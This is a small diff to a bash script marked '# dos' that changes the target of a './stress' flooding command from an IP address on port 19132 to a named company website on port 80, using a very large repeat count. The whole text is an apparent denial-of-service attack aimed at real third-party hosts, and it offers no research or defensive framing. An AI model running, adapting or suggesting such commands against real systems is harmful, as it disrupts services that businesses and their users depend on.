@@ -1,4 +1,4 @@
 #!/bin/bash
 
 # dos
-./stress 92.202.87.115 19132 2 200 1000000000000000 5
+./stress www.inomatakensetsu.co.jp 80 3 200 1000000000000000 5
